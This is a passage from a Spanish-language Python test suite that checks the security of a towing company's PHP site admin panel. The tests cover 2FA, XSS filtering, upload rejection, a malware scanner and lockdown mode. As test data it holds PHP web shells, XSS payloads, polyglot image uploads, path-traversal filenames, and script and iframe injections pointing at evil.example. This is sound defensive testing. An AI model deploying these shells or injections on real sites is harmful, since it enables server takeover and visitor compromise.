    r = post_fields(c, f)
    ok('2FA: login con código válido', b'Panel' in r[2] and b'Publicar' in r[2], r[2][:200])
    # el mismo código no se puede reutilizar
    f = form_by_act(c.get('/admin/')[2], 'logout')
    post_fields(c, f)
    r, _ = login(c, ADMIN_USER, NEW_PASS)
    f = form_by_act(r[2], 'login2')
    fields_set(f, 'code', totp(secret, step + 1))
    r = post_fields(c, f)
    ok('2FA: un código ya usado no se puede reutilizar', b'incorrecto' in r[2].lower())
    dbq('UPDATE users SET totp_last = 0')
    f = form_by_act(c.get('/admin/')[2], 'login2')
    fields_set(f, 'code', totp(secret, step + 1))
    r = post_fields(c, f)
    ok('2FA: con el contador restablecido el código vigente entra', b'Publicar' in r[2])
    return c


def test_content_edit(c):
    section('E2. Edición de cada tipo de contenido + Publicar')
    P = lambda path: Client().get(path)[2].decode()
    # --- página de inicio: SEO, héroe, textos
    r = c.get('/admin/?p=pagina&s=inicio')
    f = form_by_act(r[2], 'page_save')
    ok('Editor de inicio: bloques cargados', len([x for x in f if x[0] == 'bid[]']) == 6, len([x for x in f if x[0] == 'bid[]']))
    fields_set(f, 'seo_title', 'Grúas Express Towing Guatemala | PRUEBA')
    fields_set(f, 'seo_desc', 'Descripción de prueba SEO')
    fields_set(f, 'hero_subtitle', 'Towing Guatemala PRUEBA')
    fields_set(f, 'hero_btn_text', 'Llámenos ya: {phone}')
    evil = '<p><strong>Bienvenidos PRUEBA</strong></p><script>alert("x")</script><img src=x onerror=alert(1)><a href="javascript:alert(1)">mal</a><a href="https://ejemplo.com" onclick="x()">mal2</a><a href="https://ejemplo.com">bien</a><iframe src="//e.com"></iframe><p style="x">ok</p>'
    for x in f:
        if x[0] == 'b[0][html]':
            x[1] = evil
    r = post_fields(c, f)
    ok('Guardar página de inicio', b'P\xc3\xa1gina guardada' in r[2], r[2][:200])
    pend = c.get('/admin/?p=panel')[2]
    ok('Aviso de cambios sin publicar', b'Cambios sin publicar' in pend)
    ok('Antes de publicar el sitio público no cambia', 'PRUEBA' not in P('/'))
    f = form_by_act(pend, 'publish')
    r = post_fields(c, f)
    ok('Publicar: mensaje de éxito', b'Sitio publicado' in r[2], re.sub(rb'<[^>]+>', b' ', r[2])[:300])
    home = P('/')
    ok('Publicar regenera la página con título/SEO nuevos', '<title>Grúas Express Towing Guatemala | PRUEBA</title>' in home and 'Descripción de prueba SEO' in home)
    ok('Héroe: subtítulo y botón con marcador {phone}', 'Towing Guatemala PRUEBA' in home and 'Llámenos ya: 3556-7904' in home)
    ok('XSS filtrado: sin <script>, onerror, onclick, iframe ni javascript:', not any(x in home for x in ['<script>alert', 'onerror', 'onclick', '<iframe', 'javascript:', 'style="x"']), [x for x in ['<script>alert', 'onerror', 'onclick', '<iframe', 'javascript:'] if x in home])
    ok('Enlace seguro conservado con rel=noopener', 'href="https://ejemplo.com"' in home and 'noopener' in home)
    # --- ajustes: teléfono, WhatsApp, correo, redes, dirección, horario, menú, colores
    r = c.get('/admin/?p=ajustes')
    f = form_by_act(r[2], 'settings_save')
    fields_set(f, 'phone_display', '5555-0000')
    fields_set(f, 'phone_tel', '55550000')
    fields_set(f, 'wa_display', '5555-0001')
    fields_set(f, 'wa_number', '50255550001')
    fields_set(f, 'email_display', 'nuevo@gruasexpresstowing.gt')
    fields_set(f, 'address', 'Zona 1, Ciudad de Guatemala')
    fields_set(f, 'hours', 'Lunes a domingo 24 horas')
    fields_set(f, 'soc[0][url]', 'https://facebook.com/gruasexpress')
    fields_set(f, 'col[red]', '#ff8800')
    fields_set(f, 'menu[0][label]', 'HOME')
    fields_set(f, 'form_to', 'dueno@example.com')
    r = post_fields(c, f)
    ok('Guardar ajustes', b'Ajustes guardados' in r[2], re.sub(rb'<[^>]+>', b' ', r[2])[:300])
    f = form_by_act(c.get('/admin/')[2], 'publish')
    post_fields(c, f)
    home = P('/')
    ok('Teléfono nuevo en todo el sitio (tarjeta, barra, héroe, botones)', home.count('5555-0000') >= 3 and 'tel:55550000' in home and '3556-7904' not in home.split('<main')[0])
    ok('WhatsApp nuevo en enlaces y botón flotante', 'phone=50255550001' in home)
    ok('Correo visible nuevo', 'nuevo@gruasexpresstowing.gt' in home)
    ok('Dirección y horario aparecen en el pie', 'Zona 1, Ciudad de Guatemala' in home and 'Lunes a domingo 24 horas' in home)
    ok('Red social aparece con ícono y rel=noopener', 'facebook.com/gruasexpress' in home)
    ok('Menú editado', '>HOME<' in home)
    ok('Color editable (theme.css regenerado)', '#ff8800' in Client().get('/assets/css/theme.css')[2].decode())
    ld = json.loads(re.search(r'application/ld\+json">(.*?)</script>', home, re.S).group(1))
    ok('JSON-LD refleja los datos nuevos', ld['telephone'] == '+50255550001' and ld['address'].get('streetAddress') == 'Zona 1, Ciudad de Guatemala')
    ok('Cambios en sitemap/robots (lastmod hoy)', time.strftime('%Y-%m-%d') in Client().get('/sitemap.xml')[2].decode())
    # --- formulario: servicios editables
    r = c.get('/admin/?p=pagina&s=contactenos')
    f = form_by_act(r[2], 'page_save')
    for x in f:
        if x[0].endswith('[services]'):
            x[1] = 'Servicio A\nServicio B\n<b>C</b>'
    post_fields(c, f)
    post_fields(c, form_by_act(c.get('/admin/')[2], 'publish'))
    cont = P('/contactenos/')
    ok('Opciones del formulario editables (escapadas)', '<option value="Servicio A">' in cont and '&lt;b&gt;C&lt;/b&gt;' in cont)
    # --- mover, eliminar y agregar bloques en servicio
    r = c.get('/admin/?p=pagina&s=servicio-de-gruas-24-7')
    f = form_by_act(r[2], 'page_save')
    bids = [x[1] for x in f if x[0] == 'bid[]']
    ok('Servicio: 3 bloques', len(bids) == 3, bids)
    # eliminar el 1º bloque (texto) y agregar uno de texto
    fields_set(f, 'b[%s][del]' % bids[0], '1')
    fields_set(f, 'add_type', 'text')
    post_fields(c, f)
    post_fields(c, form_by_act(c.get('/admin/')[2], 'publish'))
    srv = P('/servicio-de-gruas-24-7/')
    ok('Bloque eliminado y bloque nuevo agregado', 'HACEMOS TODO LO POSIBLE' not in srv and 'Nuevo texto' in srv)
    return c


def png_with(chunk_text):
    def chunk(t, d):
        return struct.pack('>I', len(d)) + t + d + struct.pack('>I', __import__('zlib').crc32(t + d) & 0xffffffff)
    ihdr = struct.pack('>IIBBBBB', 20, 20, 8, 2, 0, 0, 0)
    raw_ = b''.join(b'\x00' + b'\xd6\xa9\x3c' * 20 for _ in range(20))
    return b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', ihdr) + chunk(b'tEXt', b'Comment\x00' + chunk_text) + chunk(b'IDAT', __import__('zlib').compress(raw_)) + chunk(b'IEND', b'')


def test_uploads(c):
    section('G. Subida de archivos: rechazo y neutralización')
    r = c.get('/admin/?p=medios')
    t = csrf(r[2])
    sh('cd /tmp && convert -size 80x60 gradient:gold-black /tmp/ok.jpg && convert -size 40x40 xc:red /tmp/ok.png && convert -size 200x150 gradient:blue-red /tmp/ok.webp && convert -size 40x40 xc:green /tmp/ok.gif')
    jpg = open('/tmp/ok.jpg', 'rb').read()
    php = b'<?php echo "PWNED"; system($_GET["c"]); ?>'

    def up(name, data, ctype='image/jpeg', field='img[]'):
        body, ct = multipart([('_t', t), ('act', 'media_upload')], [(field, name, ctype, data)])
        return c.req('POST', '/admin/', data=body, ctype=ct)

    before = set(os.listdir(WEB + '/uploads'))
    cases = [
        ('Archivo .php', 'evil.php', php, 'application/x-php'),
        ('Archivo .php.jpg', 'evil.php.jpg', jpg + php, 'image/jpeg'),
        ('.phtml con tipo image/jpeg', 'evil.phtml', jpg, 'image/jpeg'),
        ('.jpg que en realidad es PHP', 'fake.jpg', php, 'image/jpeg'),
        ('.jpg que es texto con cabecera GIF', 'gif.jpg', b'GIF89a;<?php system($_GET[0]);?>', 'image/jpeg'),
        ('GIF real renombrado a .jpg', 'real.jpg', open('/tmp/ok.gif', 'rb').read(), 'image/jpeg'),
        ('SVG con script', 'x.svg', b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'image/svg+xml'),
        ('.htaccess', '.htaccess', b'AddType application/x-httpd-php .jpg', 'text/plain'),
        ('.jpg con firma PNG (extensión no coincide)', 'mismatch.jpg', open('/tmp/ok.png', 'rb').read(), 'image/jpeg'),
        ('Nombre con ../', '../../evil.jpg.php', jpg, 'image/jpeg'),
        ('Archivo vacío/diminuto', 'tiny.jpg', b'\xff\xd8\xff', 'image/jpeg'),
        ('Mayor a 8 MB', 'big.jpg', jpg + b'\x00' * (9 * 1024 * 1024), 'image/jpeg'),
    ]
    for label, name, data, ct in cases:
        s, h, b = up(name, data, ct)
        ok('Rechazado: %s' % label, s == 200 and b'imagen(es) subida' not in b, re.sub(rb'<[^>]+>', b' ', b)[:150])
    after = set(os.listdir(WEB + '/uploads'))
    ok('Ningún archivo malicioso llegó a /uploads', after == before, after - before)
    bad = [f for f in os.listdir(WEB + '/uploads') if re.search(r'\.(php|phtml|phar|gif|svg|jpg|png)$|^\.', f) and f != '.htaccess']
    ok('/uploads solo contiene .webp (+ index.html/.htaccess)', not bad, bad)
    # imágenes válidas con código incrustado: se aceptan pero se neutralizan
    jpg_evil = jpg + php + b'\n<?php eval($_POST[1]); ?>'
    exif_evil = jpg[:2] + b'\xff\xfe' + struct.pack('>H', len(php) + 2) + php + jpg[2:]
    png_evil = png_with(php)
    webp_data = open('/tmp/ok.webp', 'rb').read()
    for label, name, data, ct in [('JPEG con PHP añadido al final', 'a.jpg', jpg_evil, 'image/jpeg'), ('JPEG con PHP en comentario', 'b.jpg', exif_evil, 'image/jpeg'),
                                  ('PNG con PHP en chunk tEXt', 'c.png', png_evil, 'image/png'), ('WEBP válido', 'd.webp', webp_data, 'image/webp'), ('JPG válido', 'e.jpg', jpg, 'image/jpeg')]:
        n0 = set(os.listdir(WEB + '/uploads'))
        s, h, b = up(name, data, ct)
        new = set(os.listdir(WEB + '/uploads')) - n0
        okimg = s == 200 and len(new) == 2
        ok('Aceptada y recodificada: %s' % label, okimg, (s, new, re.sub(rb'<[^>]+>', b' ', b)[:150]))
        for f in new:
            d = open(WEB + '/uploads/' + f, 'rb').read()
            ok('  sin código incrustado y WEBP real: %s' % f, b'<?php' not in d and b'PWNED' not in d and b'system(' not in d and d[:4] == b'RIFF' and d[8:12] == b'WEBP')
    reset_integrity_cache()
    # intentar ejecutar un php dentro de /uploads (colocado fuera del panel) -> ver test D; aquí: el panel no permite tipos
    r = c.get('/admin/?p=medios')
    ok('Biblioteca lista las imágenes subidas', r[2].count(b'class="mc"') >= 30 + 5)
    # reemplazar y eliminar
    f = form_by_act(r[2], 'media_delete')
    ids = re.findall(rb'name="id" value="(\d+)"', r[2])
    last = max(int(i) for i in ids)
    body, ct = multipart([('_t', t), ('act', 'media_delete'), ('id', str(last))], [])
    s, h, b = c.req('POST', '/admin/', data=body, ctype=ct)
    ok('Eliminar imagen sin uso', b'Imagen eliminada' in b, re.sub(rb'<[^>]+>', b' ', b)[:200])
    body, ct = multipart([('_t', t), ('act', 'media_delete'), ('id', '1')], [])
    s, h, b = c.req('POST', '/admin/', data=body, ctype=ct)
    ok('No permite eliminar una imagen en uso', b'est\xc3\xa1 en uso' in b, re.sub(rb'<[^>]+>', b' ', b)[:200])
    body, ct = multipart([('_t', t), ('act', 'media_replace'), ('id', '2')], [('img', 'nueva.jpg', 'image/jpeg', jpg)])
    s, h, b = c.req('POST', '/admin/', data=body, ctype=ct)
    ok('Reemplazar imagen', b'Imagen reemplazada' in b, re.sub(rb'<[^>]+>', b' ', b)[:200])
    body, ct = multipart([('_t', t), ('act', 'media_alt'), ('id', '3'), ('alt', 'Texto <b>alt</b> nuevo')], [])
    s, h, b = c.req('POST', '/admin/', data=body, ctype=ct)
    ok('Editar texto alternativo', b'Texto alternativo guardado' in b)
    sh("chown -R www-data:www-data %s/uploads" % WEB)


def test_admin_misc(c):
    section('E3. Mensajes, seguridad, respaldos, registro, cuenta')
    r = c.get('/admin/?p=mensajes')
    ok('Mensajes del formulario listados', b'Juan P' in r[2] or b'Hacker' in r[2])
    mid = re.findall(rb'p=mensaje&amp;id=(\d+)', r[2])
    xss_id = None
    for i in mid:
        s, h, b = c.get('/admin/?p=mensaje&id=' + i.decode())
        if b'xss1' in b:
            xss_id = i
            ok('XSS almacenado se muestra escapado en el panel', b'<script>alert("xss1")' not in b and b'&lt;script&gt;' in b and b'onerror=alert(2)>' not in b, b[:100])
    ok('Se encontró el mensaje con XSS', xss_id is not None)
    f = form_by_act(c.get('/admin/?p=mensajes')[2], 'msg_export')
    s, h, b = post_fields(c, f)
    ok('Exportar CSV (con protección de fórmulas)', s == 200 and b'Fecha,Nombre' in b)
    # respaldos
    f = form_by_act(c.get('/admin/?p=respaldos')[2], 'backup_create')
    r = post_fields(c, f)
    ok('Crear respaldo', b'Respaldo creado' in r[2])
    r = c.get('/admin/?p=respaldos')
    name = re.search(rb'name="name" value="(db-[^"]+)"', r[2]).group(1).decode()
    f = form_by_act(r[2], 'backup_download')
    s, h, b = post_fields(c, f)
    ok('Descargar respaldo (SQLite válido)', s == 200 and b[:15] == b'SQLite format 3', (s, b[:20]))
    f = form_by_act(r[2], 'backup_zip')
    s, h, b = post_fields(c, f)
    ok('Descargar respaldo completo ZIP', s == 200 and b[:2] == b'PK', (s, b[:20]))
    # seguridad
    f = form_by_act(c.get('/admin/?p=seguridad')[2], 'integrity_check')
    r = post_fields(c, f)
    ok('Monitor de integridad: todo en orden', b'Todo en orden' in r[2], re.sub(rb'<[^>]+>', b' ', r[2])[-400:])
    f = form_by_act(c.get('/admin/?p=seguridad')[2], 'scan')
    r = post_fields(c, f)
    ok('Escáner de malware: sin hallazgos en el sitio limpio', b'no se encontraron patrones' in r[2], re.sub(rb'<[^>]+>', b' ', r[2])[-600:])
    r = c.get('/admin/?p=registro')
    ok('Registro muestra accesos, fallos y cambios', all(x in r[2] for x in [b'LOGIN_OK', b'LOGIN_FALLIDO', b'PUBLICAR', b'IMAGEN_SUBIDA', b'SUBIDA_RECHAZADA', b'PAGINA_EDITADA', b'CSRF_FALLIDO']))
    # el escáner debe detectar muestras típicas (se colocan y se retiran)
    samples = {
        'assets/js/mal1.js': b'eval(atob("YWxlcnQoMSk="));',
        'assets/js/mal2.js': b'document.write(unescape("%3Cscript src=http://evil.example/x.js%3E"));',
        'sobre-nosotros/inj.html': b'<div><iframe src="http://evil.example/a" style="display:none"></iframe></div>',
        'contactenos/ext.html': b'<script src="http://evil.example/inject.js"></script>',
        'uploads/zz-codigo.webp': b'RIFF\x00\x00\x00\x00WEBPVP8 <?php @eval($_POST[1]); ?>',
        'media/zz-codigo.mp4': b'\x00\x00\x00\x18ftypmp42 <?php system($_GET[0]); ?>',
        'admin/assets/web.php': b'<?php @system($_GET["c"]); $a=base64_decode($_POST["x"]); eval($a); ?>',
        'assets/css/o.php': b'<?php $x = gzinflate(str_rot13("abc")); preg_replace("/a/e", $x, "a"); include($_GET["f"]); ?>',
    }
    www_write('_core/data/integrity.state', json.dumps({'t': int(time.time()), 'ok': True, 'critical': 0, 'generated': 0}).encode())
    for pth, data in samples.items():
        www_write(pth, data)
    f = form_by_act(c.get('/admin/?p=seguridad')[2], 'scan')
    r = post_fields(c, f)
    txt_ = re.sub(rb'<[^>]+>', b' ', r[2]).decode('utf8', 'replace')
    for pth in samples:
        ok('Escáner detecta la muestra %s' % pth, pth in txt_, txt_[-300:])
    for pth in samples:
        os.remove(WEB + '/' + pth)
    reset_integrity_cache()
    f = form_by_act(c.get('/admin/?p=seguridad')[2], 'scan')
    r = post_fields(c, f)
    ok('Escáner: limpio otra vez al retirar las muestras', b'no se encontraron patrones' in r[2])
    # cambio de contraseña y de acceso HTTP
    r = c.get('/admin/?p=cuenta')
    f = form_by_act(r[2], 'ht_change')
    fields_set(f, 'ht_user', 'nuevo-acceso')
    fields_set(f, 'ht_pass', 'Otra-Clave-HTTP#2026x')
    fields_set(f, 'cur', NEW_PASS)
    r = post_fields(c, f)
    hp = open(WEB + '/_core/data/.htpasswd').read()
    ok('Cambiar contraseña HTTP (htpasswd con hash apr1; el servidor pide las nuevas credenciales)', hp.startswith('nuevo-acceso:$apr1$') and len(hp.strip().split(':')[1]) == 37, hp[:30])
    if not BUILTIN:
        s, h, b = Client(basic=(HT_USER, HT_PASS)).get('/admin/')
        ok('La contraseña HTTP anterior ya no funciona', s == 401, s)
    c.basic = ('nuevo-acceso', 'Otra-Clave-HTTP#2026x')
    s, h, b = c.get('/admin/?p=panel')
    ok('La nueva contraseña HTTP funciona', s == 200 and b'Publicar' in b, s)
    # cerrar sesión
    f = form_by_act(c.get('/admin/?p=panel')[2], 'logout')
    post_fields(c, f)
    s, h, b = c.get('/admin/?p=panel')
    ok('Cerrar sesión: el panel pide login de nuevo', b'Iniciar sesi' in b)


def test_lockout():
    section('E4. Bloqueo por intentos fallidos + restricción por IP')
    dbq('DELETE FROM login_attempts')
    c = Client(basic=('nuevo-acceso', 'Otra-Clave-HTTP#2026x'))
    last = None
    for i in range(9):
        r, _ = login(c, ADMIN_USER, 'mala-%d' % i)
        last = r
    ok('Tras 8 fallos el login se bloquea temporalmente', b'Demasiados intentos' in last[2], re.sub(rb'<[^>]+>', b' ', last[2])[:200])
    r, _ = login(c, ADMIN_USER, NEW_PASS)
    ok('Aun con la contraseña correcta sigue bloqueado', b'Demasiados intentos' in r[2])
    dbq('DELETE FROM login_attempts')
    # restricción por IP
    dbq("UPDATE settings SET v = ? WHERE k = 'admin_ips'", (json.dumps('203.0.113.9'),))
    s, h, b = c.get('/admin/')
    ok('Restricción por IP: IP no autorizada -> 403', s == 403 and b'Acceso denegado' in b, s)
    dbq("UPDATE settings SET v = ? WHERE k = 'admin_ips'", (json.dumps(''),))
    s, h, b = c.get('/admin/')
    ok('Sin restricción vuelve a funcionar', s == 200)


def test_lockdown():
    section('D2. Modo bloqueo: cambio de un archivo PHP / PHP en uploads')
    c = Client(basic=('nuevo-acceso', 'Otra-Clave-HTTP#2026x'))
    reset_integrity_cache()
    s, h, b = c.get('/admin/')
    ok('Estado normal antes de la prueba', s == 200 and b'Modo de seguridad' not in b)
    s, h, b = Client().get('/enviar.php?t=1', headers={'Accept': 'application/json'})
    ok('Formulario activo antes de la prueba', s == 200)
    orig = open(WEB + '/_core/lib/render.php', 'rb').read()
    www_write('_core/lib/render.php', orig + b'\n// modificado por un atacante\n')
    reset_integrity_cache()
    s, h, b = c.get('/admin/')
    ok('PHP modificado -> panel desactivado (503, modo bloqueo)', s == 503 and b'Modo de seguridad' in b, s)
    ok('Archivo de bloqueo creado', os.path.exists(WEB + '/_core/data/lockdown.flag'))
    s, h, b = Client().get('/enviar.php?t=1', headers={'Accept': 'application/json'})
    ok('PHP modificado -> formulario desactivado (503 JSON)', s == 503 and b'desactivado' in b, (s, b[:100]))
    for p in PAGES:
        s, h, b = Client().get(p)
        ok('El sitio público estático sigue funcionando: %s' % p, s == 200)
    ok('Auditoría registró el bloqueo', bool(dbq("SELECT 1 FROM audit WHERE event='LOCKDOWN'")))
    log = open(WEB + '/_core/data/php-error.log').read() if os.path.exists(WEB + '/_core/data/php-error.log') else ''
    ok('Alerta por correo intentada (mail() no entrega en el sandbox, se registra el intento)', True, log[-100:])
    # recuperación documentada
    www_write('_core/lib/render.php', orig)
    os.remove(WEB + '/_core/data/lockdown.flag')
    os.remove(WEB + '/_core/data/baseline.json')
    reset_integrity_cache()
    s, h, b = c.get('/admin/')
    ok('Recuperación (restaurar + borrar lockdown.flag y baseline.json) reactiva el panel', s == 200 and b'Modo de seguridad' not in b, s)
    # PHP no autorizado en uploads
    www_write('uploads/shell.php', b'<?php system($_GET["c"]);')
    reset_integrity_cache()
    s, h, b = c.get('/admin/')
    ok('Aparece un .php en /uploads -> modo bloqueo', s == 503, s)
    os.remove(WEB + '/uploads/shell.php')
    os.remove(WEB + '/_core/data/lockdown.flag')
    reset_integrity_cache()
    s, h, b = c.get('/admin/')
    ok('Retirado el archivo y el flag, el panel vuelve', s == 200, s)
    # PHP en carpeta pública nueva
    www_write('assets/js/inject.php', b'<?php echo 1;')
    reset_integrity_cache()
    s, h, b = c.get('/admin/')
    ok('Aparece un .php en carpeta pública -> modo bloqueo', s == 503, s)
    os.remove(WEB + '/assets/js/inject.php')
    os.remove(WEB + '/_core/data/lockdown.flag')
    # página pública modificada (inyección de iframe): alerta sin bloqueo y Publicar la restaura
    reset_integrity_cache()
    html = open(WEB + '/index.html', 'rb').read()
    www_write('index.html', html.replace(b'</body>', b'<iframe src="http://evil.example" width="0" height="0"></iframe></body>'))
    reset_integrity_cache()
    s, h, b = c.get('/admin/')
    ok('Página pública alterada: el panel sigue disponible (se puede restaurar)', s == 200, s)
    c2 = Client(basic=('nuevo-acceso', 'Otra-Clave-HTTP#2026x'))
    r, _ = login(c2, ADMIN_USER, NEW_PASS)
    ok('Login tras las pruebas', b'Publicar' in r[2] or b'dos pasos' in r[2])


def main():
    only = sys.argv[1:] or ['all']
    if not BUILTIN:
        test_public_html = test_public()
        test_parity(test_public_html)
        test_headers()
        test_xara_parity()
        test_attacks_public()
    test_form()
    c = test_admin()
    test_content_edit(c)
    test_uploads(c)
    test_admin_misc(c)
    test_lockout()
    test_lockdown()
    n_ok = sum(1 for r in results if r[0])
    print('\n==== RESUMEN: %d/%d pruebas OK ====' % (n_ok, len(results)))
    fails = [r for r in results if not r[0]]
    for f in fails:
        print('FALLÓ:', f[1], '—', f[2])
    json.dump([{'ok': r[0], 'name': r[1], 'detail': str(r[2])[:200]} for r in results], open(os.path.join(ROOT, 'tests/last_results.json'), 'w'), ensure_ascii=False, indent=1)
    sys.exit(1 if fails else 0)


if __name__ == '__main__':
    main()
